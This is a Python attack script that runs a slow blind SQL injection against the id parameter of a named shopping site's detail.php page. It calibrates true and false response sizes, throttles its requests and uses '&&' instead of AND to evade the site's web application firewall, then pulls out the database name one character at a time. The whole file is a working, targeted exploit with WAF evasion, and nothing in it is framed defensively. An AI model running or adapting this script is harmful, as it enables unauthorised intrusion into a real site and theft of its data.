#!/usr/bin/env python3
"""yijingweb: ULTRA-SLOW blind extraction via && (5s interval, single-shot per char)
Oracle: id=686' && (select substr(database(),P,1)='C')-- 
true vs false size differs by ~684B (26675 vs 25991)
"""
import urllib.request, urllib.parse, string, time, sys

UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Accept": "*/*"}
BASE = "http://yijingweb.com/webmall/detail.php"
CHARS = string.digits + string.ascii_lowercase + string.ascii_uppercase + "_-."

def fetch(url, timeout=12):
    try:
        req = urllib.request.Request(url, headers=UA)
        r = urllib.request.urlopen(req, timeout=timeout)
        body = r.read()
        return r.status, len(body), b"\xe4\xba\x91\xe7\xbd\x91\xe7\x9b\xbe" in body  # 云网盾
    except urllib.error.HTTPError as e:
        body = e.read(5000)
        return e.code, len(body), b"\xe4\xba\x91\xe7\xbd\x91\xe7\x9b\xbe" in body
    except Exception:
        return 0, 0, False

def get_sz(payload):
    code, size, blocked = fetch(BASE + "?id=686" + payload)
    return size, blocked

print("[*] waiting 120s cooldown...", flush=True)
time.sleep(120)

# calibrate with && (bypasses AND WAF)
print("[*] calibrating...", flush=True)
t_sizes, f_sizes = [], []
for _ in range(2):
    s, b = get_sz("%27%20%26%26%20(select%201)=1--%20")
    if b or s < 5000:
        print("BLOCKED (%s)" % s, flush=True)
        time.sleep(60)
        continue
    t_sizes.append(s)
    time.sleep(5)
    s, b = get_sz("%27%20%26%26%20(select%201)=2--%20")
    if b or s < 5000:
        print("BLOCKED (%s)" % s, flush=True)
        time.sleep(60)
        continue
    f_sizes.append(s)
    time.sleep(5)
if not t_sizes or not f_sizes:
    print("CALIBRATION FAILED", flush=True)
    sys.exit(1)
t = sum(t_sizes)//len(t_sizes)
f = sum(f_sizes)//len(f_sizes)
print("true=%s avg=%d | false=%s avg=%d diff=%d" % (t_sizes, t, f_sizes, f, t - f), flush=True)
threshold = (t + f) / 2

def is_true(expr):
    payload = "%27%20%26%26%20(" + urllib.parse.quote(expr) + ")--%20"
    s, b = get_sz(payload)
    time.sleep(5)
    if b or s < 5000:
        print("  (blocked %s, retry)" % s, flush=True)
        time.sleep(60)
        s, b = get_sz(payload)
        time.sleep(5)
    return s > threshold

db = ""
for pos in range(1, 16):
    found = False
    for c in CHARS:
        expr = "select substr(database(),%d,1)='%s'" % (pos, c)
        if is_true(expr):
            db += c
            print("pos%d=%s -> %s" % (pos, c, db), flush=True)
            found = True
            break
    if not found:
        db += "?"
        print("pos%d=? -> %s" % (pos, db), flush=True)
    time.sleep(2)
print("DATABASE:", db, flush=True)
